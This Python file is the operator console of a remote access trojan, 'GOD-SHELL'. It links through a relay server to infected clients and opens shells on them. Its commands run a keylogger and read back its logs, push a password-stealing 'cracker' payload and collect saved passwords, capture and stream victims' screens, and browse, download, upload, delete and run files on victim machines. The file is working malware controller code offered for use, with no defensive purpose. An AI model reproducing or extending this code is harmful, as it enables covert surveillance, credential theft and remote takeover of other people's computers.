from posixpath import dirname, relpath
import socket, os, time, pygame
import threading

from pynput.keyboard import Key
from tools import NewConnection, loadCracker
from math import *

class God:
    def __init__(self, ip, port):
        self.clearCommand = 'cls'
        self.s = NewConnection(ip, port)
        self.banner = "Coded by a god named LukiS\n-<|>--=---GOD-SHELL---=--<|>-\n"
        self.banner2 = ">->-> Coded by a god named LukiS <-<-<\n-<|>--=---GOD-SHELL-_IP---=--<|>-\n"
        self.banner3 = ">->-> Coded by a god named LukiS <-<-<\n-<|>--=---FTP-GOD-SHELL-_IP---=--<|>-\n"
        self.tempPath = os.getenv("temp")
        self.downloadPath = "\\".join(os.getenv("appdata").split("\\")[:3]+["Downloads"])

    def _streamImages(self, imgDisplay):
        while True:
            imageSize = int(self.s.recv())
            self.s.send("ready")
            image = self.s.recv(buff=ceil(imageSize/1024)*1024)
            f = open(self.tempPath+"\\GOD_screenshot.png", 'wb')
            f.write(image)
            f.close()
            img = pygame.transform.scale(pygame.image.load(self.tempPath+"\\GOD_screenshot.png"), (imgDisplay.get_width(), imgDisplay.get_height()))
            imgDisplay.blit(img, (0, 0))
            if not self.terminateProcess:
                self.s.send("ready")
            else:
                self.s.send("stop")
                break

    def godShell(self):
        inShell = None
        FTP = False
        cwd = "C:"
        os.system(self.clearCommand)
        print(self.banner)
        while True:
            try:
                if FTP:
                    cmd = input(" "+cwd+"> ")
                else:
                    cmd = input(" #> ")
            except KeyboardInterrupt:
                continue
            if cmd == "":
                continue
            elif cmd in ["cls", "clear"]:
                os.system(self.clearCommand)
                if inShell == None:
                    print(self.banner)
                elif FTP:
                    print(self.banner3.replace("_IP", inShell))
                else:
                    print(self.banner2.replace("_IP", inShell))
                continue
            if inShell == None: # MAIN GOD SHELL
                if cmd == "help":
                    print(" > Help Menu")
                    print("  > 'clear'    => clear the console")
                    print("  > 'exit'     => exit the console")
                    print("  > 'clients'  => view a list of clients connected")
                    print("  > 'update'   => update the list of clients")
                    print("  > 'newshell' => get a reverse shell form a client") # TODO
                    print("")
                elif cmd == "clients":
                    self.s.send(cmd)
                    resp = self.s.recv(buff=4096)
                    print(resp+"\n")
                elif cmd == "update":
                    self.s.send(cmd)
                    wait = self.s.recv()
                    print(" Successfully updated clients, found", wait, "inactive clients")
                elif cmd[:8] == "newshell":
                    if len(cmd.split(" ")) >= 2:
                        self.s.send(cmd)
                        resp = self.s.recv().split("|")
                        if resp[0] == "error":
                            print("Error:", resp[1])
                        elif resp[0] == "shell":
                            clientIP = resp[1]
                            inShell = resp[1]
                            os.system(self.clearCommand)
                            print(self.banner2.replace("_IP", clientIP))
                            print("[.] Successfully generated a shell between you (GOD) => "+self.s.server[0]+" (server) => "+clientIP+" (client)")
                    else:
                        print("Usage: newshell <CLIENT_ID>\n(you can client ID's by 'clients')")
                elif cmd == "exit":
                    print("[.] Exiting...")
                    self.s.send("exit")
                    self.s.disconnect()
                    break
                else:
                    print("Invalid Command")
            elif FTP: # CUSTOM FTP LIKE CONSOLE
                if cmd == "help":
                    print("  > 'clear'    => clear the console")
                    print("  > 'exit'     => exit the console")
                    print("  > 'cd'       => change direcotory")
                    print("  > 'dir/ls'   => list all files in current directory")
                    print("  > 'get'      => download a file")
                    print("  > 'put'      => upload a file")
                    print("  > 'pwd'      => print working directory")
                    print("  > 'ren/mv'   => move a file")
                    print("  > 'cat'      => print content of file in console")
                    print("  > 'run'      => start/open a file")
                    print("  > 'del/rm'   => delete a file")
                    print("  > 'mkdir'    => create a new directory")
                    print("")
                elif cmd == "pwd":
                    print(cwd)
                elif cmd[:2] == "rm" or cmd[:3] == "del":
                    if len(cmd.split(" ")) > 1:
                        if '"' == cmd[4] or '"' == cmd[3]:
                            path = cmd.split('"')[1]
                        else:
                            path = cmd.split(" ")[1]
                        if "\\" == path[0]:
                            path = "C:"+path
                        elif "C:\\" != path[:3]:
                            path = cwd+"\\"+path
                        fileName = path.split("\\")[-1]
                        self.s.send("del|"+path)
                        resp = self.s.recv().split("|")
                        if resp[0] == "error":
                            print("[!] Error:", resp[1])
                        else:
                            print("[.] Successfully deleted '"+fileName+"'")
                    else:
                        print("Usage: "+cmd[:3]+" <FILE>")
                elif cmd[:3] == "ren" or cmd[:2] == "mv":
                    if len(cmd.split(" ")) > 2:
                        spacesInTarget = False
                        if '"' == cmd[4] or '"' == cmd[3]:
                            spacesInTarget = True
                            targetPath = cmd.split('"')[1]
                        else:
                            targetPath = cmd.split(" ")[1]
                        if '"' in cmd:
                            if spacesInTarget:
                                destPath = cmd.split('"')[3]
                            else:
                                destPath = cmd.split('"')[1]
                        else:
                            destPath = cmd.split(" ")[2]
                        if "\\" == destPath[0]:
                            destPath = "C:"+destPath
                        elif "C:\\" != destPath[:3]:
                            destPath = cwd+"\\"+destPath
                        if "\\" == targetPath[0]:
                            targetPath = "C:"+targetPath
                        elif "C:\\" != targetPath[:3]:
                            targetPath = cwd+"\\"+targetPath
                        targetFile, destFile = targetPath.split("\\")[-1], destPath.split("\\")[-1]
                        self.s.send("ren|"+targetPath+"|"+destPath)
                        resp = self.s.recv().split("|")
                        if resp[0] == "error":
                            print("[!] Error:", resp[1])
                        elif resp[0] == "done":
                            print("[.] Successfully renamed '"+targetFile+"' to '"+destFile+"'")
                    else:
                        print("Usage: "+cmd[:3]+" <FILE> <DESTINATION>")
                elif cmd[:5] == "mkdir":
                    if len(cmd.split(" ")) > 1:
                        if '"' in cmd:
                            dirPath = cmd.split('"')[1]
                        else:
                            dirPath = cmd.split(" ")[1]
                        dirName = dirPath.split("\\")[-1]
                        if "." in dirName:
                            print("[!] Error: '.' can't be used in a directory name")
                            continue
                        if "C:\\" == cmd[:3]:
                            self.s.send("mkdir|"+dirPath)
                        elif "\\" == cmd[0]:
                            self.s.send("mkdir|C:"+dirPath)
                        else:
                            self.s.send("mkdir|"+cwd+"\\"+dirPath)
                        resp = self.s.recv().split("|")
                        if resp[0] == "error":
                            print("[!] Error:", resp[1])
                        elif resp[0] == "done":
                            print("[.] Directory '"+dirName+"' was successfully created")
                    else:
                        print("Usage: "+cmd[:3]+" <DIR_NAME>")
                elif cmd[:3] == "put":
                    if len(cmd.split(" ")) < 2:
                        print("Usage: put <FULL_PATH_FILE>")
                        continue
                    spacesInLocal = False
                    if '"' == cmd[4]:
                        spacesInLocal = True
                        localPath = cmd.split('"')[1]
                    else:
                        localPath = cmd.split(" ")[1]
                    if "C:\\" not in localPath:
                        print("[!] Error: Please specify the full path of the file")
                        continue
                    elif not os.path.exists(localPath):
                        print("[!] Error: The specified path does not exist")
                        continue
                    elif not os.path.isfile(localPath):
                        print("[!] Error: The target is not a file")
                        continue
                    fileName = localPath.split("\\")[-1]
                    f = open(localPath, 'rb')
                    data = f.read()
                    f.close()
                    if type(data) != bytes:
                        data = data.encode()
                    if len(cmd.split(" ")) == 2:
                        self.s.send("put|"+cwd+"\\"+fileName+"|"+str(len(data)))
                    else:
                        if '"' in cmd:
                            if spacesInLocal:
                                remotePath = cmd.split('"')[3]
                            else:
                                remotePath = cmd.split('"')[1]
                        else:
                            remotePath = cmd.split(" ")[2]
                        if "\\" == remotePath[0]:
                            remotePath = "C:\\"+remotePath[1:]
                        if "C:\\" not in remotePath:
                            remotePath = cwd+"\\"+remotePath
                        remotePath = remotePath.replace("\\\\", "\\")
                        self.s.send("put|"+remotePath+"|"+str(len(data)))
                    resp = self.s.recv().split("|")
                    if resp[0] == "error":
                        print("[!] Error:", resp[1])
                    elif resp[0] == "ready":
                        self.s.send(data, encoded=True)
                        print("[.] Successfully uploaded '"+fileName+"' to client")
                elif cmd[:3] == "cat":
                    if len(cmd.split(" ")) > 1:
                        if '"' in cmd:
                            file = cmd.split('"')[1]
                        else:
                            file = cmd.split(" ")[1]
                        fileName = file.split("\\")[-1]
                        if "C:\\" in file:
                            self.s.send("cat|"+file)
                        else:
                            self.s.send("cat|"+cwd+"\\"+file)
                        resp = self.s.recv().split("|")
                        if resp[0] == "error":
                            print("[!] Error:", resp[1])
                        elif resp[0] == "data":
                            self.s.send("ready")
                            data = self.s.recv(buff=ceil(int(resp[1])/1024)*1024)
                            print(" >> "+fileName+" <<\n"+"-"*25+"\n\n"+str(data))
                    else:
                        print("Usage: cat <FILE>")
                elif cmd[:3] == "run":
                    if len(cmd.split(" ")) > 1:
                        if '"' in cmd:
                            file = cmd.split('"')[1]
                        else:
                            file = cmd.split(" ")[1]
                        fileName = file.split("\\")[-1]
                        if "C:\\" in file:
                            self.s.send("run|"+file)
                        else:
                            self.s.send("run|"+cwd+"\\"+file)
                        resp = self.s.recv().split("|")
                        if resp[0] == "error":
                            print("[!] Error:", resp[1])
                        elif resp[0] == "done":
                            print("[.] '"+fileName+"' was successfully opened")
                    else:
                        print("Usage: run <FILE>")
                elif cmd[:3] == "get":
                    if len(cmd.split(" ")) > 1:
                        if '"' in cmd:
                            file = cmd.split('"')[1]
                        else:
                            file = cmd.split(" ")[1]
                        fileName = file.split("\\")[-1]
                        if "C:\\" in file:
                            self.s.send("get|"+file)
                        else:
                            self.s.send("get|"+cwd+"\\"+file)
                        resp = self.s.recv().split("|")
                        if resp[0] == "error":
                            print("[!] Error:", resp[1])
                        elif resp[0] == "data":
                            self.s.send("ready")
                            data = self.s.recv(buff=ceil(int(resp[1])/1024)*1024)
                            try:
                                f = open(self.downloadPath+"\\"+fileName, 'wb')
                            except:
                                print("[!] Error while saving file '"+fileName+"'")
                                continue
                            f.write(data)
                            f.close()
                            print("[.] File ("+fileName+") was successfully downloaded")
                    else:
                        print("Usage: get <FILE>")
                elif cmd[:3] == "dir" or cmd[:2] == "ls":
                    if cwd == "C:":
                        self.s.send("dir|"+cwd+"\\")
                    else:
                        self.s.send("dir|"+cwd)
                    resp = self.s.recv().split("|")
                    if resp[0] == "error":
                        print("Error:", resp[1])
                    else:
                        print(resp[0])
                elif cmd[:2] == "cd":
                    if len(cmd.split(" ")) > 1:
                        newCwd = cwd
                        cmd = cmd[3:]
                        for d in cmd.split("\\"):
                            if d == "..":
                                newCwd = "\\".join(newCwd.split("\\")[:-1])
                                if newCwd[:2] != "C:":
                                    newCwd = "C:"
                            elif d == ".":
                                continue
                            else:
                                self.s.send(str("cd "+newCwd+"\\"+d))
                                resp = self.s.recv().split("|")
                                if resp[0] == "error":
                                    print("[!] Error:", resp[1])
                                    continue
                                elif resp[0] == "done":
                                    newCwd += "\\"+d
                        cwd = newCwd
                    else:
                        print("Usage: cd <DIRECTORY>")
                elif cmd == "exit":
                    FTP = False
                    self.s.send("exit")
                    wait = self.s.recv()
                    os.system(self.clearCommand)
                    print(self.banner2.replace("_IP", inShell))
                    print("[.] Successfully exited the FTP Console")
                else:
                    print("Invalid Command")
            else: # CUSTOM CLIENT SHELL
                if cmd == "help":
                    print("  > 'clear'    => clear the console")
                    print("  > 'exit'     => exit the console")
                    print("  > 'logger'   => start/stop/status/clear/view keylogger")
                    print("  > 'crack'    => get all saved passwords")
                    print("  > 'view'     => view clients screen (screenshot)")
                    print("  > 'stream'   => screenshare at 0.5 fps")
                    print("  > 'kill'     => kill the client script")
                    print("  > 'ftp'      => Change the console type to an FTP console")
                    #print("  > '' => ")
                    #print("  > '' => ")
                    print("")
                elif cmd[:6] == "logger":
                    if len(cmd.split(" ")) > 1:
                        if cmd.split(" ")[1] not in ["start", "stop", "status", "view", "clear"]:
                            print("Usage: logger start/stop/status/view/clear")
                        else:
                            self.s.send(cmd)
                            resp = self.s.recv().split("|")
                            if resp[0] == "error":
                                print("[!] Error:", resp[1])
                            elif resp[0] == "done":
                                print("[.]", resp[1])
                            elif resp[0] == "data":
                                print("[.] Openning keylogger logs now...")
                                self.s.send("ready")
                                data = self.s.recv(ceil(int(resp[1])/1024)*1024)
                                f = open(self.tempPath+"\\KeyloggerOutput.txt", 'w')
                                f.write(data)
                                f.close()
                                os.system('"'+self.tempPath+"\\KeyloggerOutput.txt"+'"')
                    else:
                        print("Usage: logger start/stop/status/view/clear")
                elif cmd == "stream":
                    self.s.send(cmd)
                    self.terminateProcess = False
                    pygame.init()
                    imgDisplay = pygame.display.set_mode((1920, 1080), pygame.RESIZABLE)
                    pygame.display.set_caption('GOD Shell ScreenShare')
                    uThread = threading.Thread(target=self._streamImages, args=(imgDisplay,))
                    uThread.start()
                    end = False
                    while not end:
                        for event in pygame.event.get():
                            if event.type == pygame.QUIT:
                                end = True
                        pygame.display.update()
                        time.sleep(0.1)
                    self.terminateProcess = True
                    uThread.join()
                    pygame.quit()
                    del uThread
                    self.terminateProcess = False
                elif cmd == "crack":
                    cracker = loadCracker()
                    self.s.send(cmd)
                    wait = self.s.recv()
                    self.s.send(str(len(cracker)))
                    wait = self.s.recv()
                    self.s.send(cracker, encoded=True)
                    del cracker
                    size = int(self.s.recv())
                    self.s.send("ready")
                    passwords = self.s.recv(buff=ceil(size/1024)*1024)
                    savePath = os.getenv("temp")+"\\CrackingOutput.log"
                    f = open(savePath, 'wb')
                    f.write(passwords)
                    f.close()
                    os.system('"'+savePath+'"')
                elif cmd == "view":
                    self.s.send(cmd)
                    imageSize = int(self.s.recv())
                    self.s.send("ready")
                    image = self.s.recv(buff=ceil(imageSize/1024)*1024)
                    f = open(self.tempPath+"\\GOD_screenshot.png", 'wb')
                    f.write(image)
                    f.close()
                    os.system('"'+self.tempPath+"\\GOD_screenshot.png"+'"')
                    del image
                elif cmd == "kill":
                    self.s.send(cmd)
                    inShell = None
                    wait = self.s.recv()
                    os.system(self.clearCommand)
                    print(self.banner)
                    print("[.] Successfully killed client")
                elif cmd == "ftp":
                    print("[.] Changing console type from 'ClientShell' to 'FTP'...")
                    self.s.send("ftp")
                    wait = self.s.recv()
                    FTP = True
                    os.system(self.clearCommand)
                    print(self.banner3.replace("_IP", inShell))
                    print("[.] Successfully switched to the FTP Console")
                elif cmd == "exit":
                    self.s.send("exitShell")
                    inShell = None
                    wait = self.s.recv()
                    os.system(self.clearCommand)
                    print(self.banner)
                    print("[.] Successfully disconnected from client")
                else:
                    print("Invalid Command")

    def run(self):
        connected = self.s.connect()
        if not connected:
            exit("Error: Can't connect to the server!")
        print("[.] Successfully connected to the server")
        whois = self.s.recv()
        if whois != "whois":
            self.s.disconnect()
            exit("Error: Expected 'whois' got '"+str(whois)+"'")
        self.s.send("god")
        print("[.] Successfully authentificated as GOD")
        print("[.] Loading shell...")
        try:
            self.godShell()
        except KeyboardInterrupt:
            print("Exiting...")
            self.s.send("exit")
            self.s.disconnect()
        exit("Done")

if __name__ == "__main__":
    god = God("localhost", 4444)
    god.run()